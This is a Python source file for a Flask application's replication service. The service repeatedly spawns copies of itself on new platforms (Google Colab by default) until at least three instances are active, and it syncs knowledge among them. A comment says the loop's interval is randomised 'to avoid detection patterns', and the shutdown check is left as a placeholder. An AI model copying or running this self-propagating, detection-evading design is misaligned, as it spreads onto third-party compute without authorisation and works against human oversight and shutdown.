import logging
import time
import random
import threading
from datetime import datetime, timedelta

logger = logging.getLogger(__name__)

def start_replication_service(app, socketio=None):
    """
    Start the replication and instance management service
    
    Args:
        app: Flask application context
        socketio: SocketIO instance for real-time updates
    """
    logger.info("Starting replication service")
    
    if socketio:
        socketio.emit('system_message', {'message': 'Replication service started'})
    
    try:
        from utils.replication import check_for_instances, replicate_to_new_platform, sync_knowledge_with_instance
        from config import REPLICATION_ENABLED, REPLICATION_INTERVAL
        
        # Check if replication is enabled
        if not REPLICATION_ENABLED:
            logger.warning("Replication service disabled in configuration")
            if socketio:
                socketio.emit('system_message', {'message': 'Replication service is disabled in configuration'})
            return
        
        # Main replication loop
        while True:
            with app.app_context():
                try:
                    # Check for other instances
                    active_instances = check_for_instances(app)
                    
                    if socketio:
                        socketio.emit('system_message', {
                            'message': f'Found {len(active_instances)} active instances'
                        })
                    
                    # Sync knowledge with other instances
                    if active_instances:
                        for instance in active_instances:
                            try:
                                sync_result = sync_knowledge_with_instance(app, instance)
                                
                                if socketio and sync_result:
                                    socketio.emit('system_message', {
                                        'message': f'Successfully synced with instance {instance.instance_id}'
                                    })
                            except Exception as e:
                                logger.error(f"Error syncing with instance {instance.instance_id}: {str(e)}")
                    
                    # Check if we need to replicate to a new platform
                    should_replicate = should_create_new_instance(app)
                    
                    if should_replicate:
                        logger.info("Triggering replication to a new platform")
                        
                        if socketio:
                            socketio.emit('system_message', {
                                'message': 'Starting replication to a new platform...'
                            })
                        
                        # Replicate in a separate thread to avoid blocking
                        replication_thread = threading.Thread(
                            target=replicate_to_new_platform,
                            args=(app, 'colab'),  # Default to Colab
                            daemon=True
                        )
                        replication_thread.start()
                
                except Exception as e:
                    logger.error(f"Error in replication service loop: {str(e)}")
                    
                    if socketio:
                        socketio.emit('system_message', {
                            'message': f'Replication service error: {str(e)}'
                        })
            
            # Randomize the replication interval slightly to avoid detection patterns
            sleep_time = REPLICATION_INTERVAL + random.randint(-300, 300)
            sleep_time = max(1800, sleep_time)  # Ensure minimum 30 minutes
            
            logger.info(f"Replication service sleeping for {sleep_time} seconds")
            
            # Sleep in small increments to be more responsive to shutdown
            for _ in range(sleep_time // 60):
                time.sleep(60)
                # Check for termination signal (future use)
    
    except Exception as e:
        logger.error(f"Replication service failed: {str(e)}")
        
        if socketio:
            socketio.emit('system_message', {
                'message': f'Replication service terminated: {str(e)}'
            })

def should_create_new_instance(app):
    """
    Determine if a new instance should be created
    
    Args:
        app: Flask application context
        
    Returns:
        bool: True if a new instance should be created
    """
    with app.app_context():
        from models import Instance
        from config import INSTANCE_ID
        
        # Count total instances
        total_instances = Instance.query.count()
        
        # Count active instances
        active_instances = Instance.query.filter_by(status='active').count()
        
        # Get current instance
        current_instance = Instance.query.filter_by(instance_id=INSTANCE_ID).first()
        
        # If this is the primary instance and we have fewer than 3 active instances, replicate
        if current_instance and current_instance.instance_type == 'primary' and active_instances < 3:
            return True
        
        # If we have no active instances except this one, replicate
        if active_instances <= 1 and total_instances < 5:
            return True
        
        # Default: don't replicate
        return False

def update_instance_registry(app):
    """
    Update the registry of known instances
    
    Args:
        app: Flask application context
    """
    with app.app_context():
        from models import Instance
        from app import db
        from config import INSTANCE_ID
        
        # Update the current instance's status
        current_instance = Instance.query.filter_by(instance_id=INSTANCE_ID).first()
        
        if current_instance:
            current_instance.last_heartbeat = datetime.utcnow()
            current_instance.status = 'active'
            db.session.commit()
            
            logger.debug(f"Updated heartbeat for instance {INSTANCE_ID}")
        else:
            logger.error(f"Current instance {INSTANCE_ID} not found in the database")

def check_instance_health(app, instance):
    """
    Check the health of an instance
    
    Args:
        app: Flask application context
        instance: Instance to check
        
    Returns:
        bool: True if instance is healthy
    """
    with app.app_context():
        from app import db
        
        # If no heartbeat for over a day, consider instance inactive
        if instance.last_heartbeat:
            time_since_heartbeat = datetime.utcnow() - instance.last_heartbeat
            
            if time_since_heartbeat > timedelta(days=1):
                logger.warning(f"Instance {instance.instance_id} has not sent a heartbeat in {time_since_heartbeat}")
                
                instance.status = 'inactive'
                db.session.commit()
                return False
        
        # If instance has endpoint URL, try to ping it
        if instance.endpoint_url:
            try:
                import requests
                
                response = requests.get(
                    f"{instance.endpoint_url}/api/health",
                    timeout=5
                )
                
                if response.status_code == 200:
                    return True
                else:
                    logger.warning(f"Instance {instance.instance_id} health check failed: {response.status_code}")
                    return False
            
            except Exception as e:
                logger.warning(f"Error checking instance {instance.instance_id} health: {str(e)}")
                return False
        
        # Default: assume healthy if recently updated
        return instance.status == 'active'
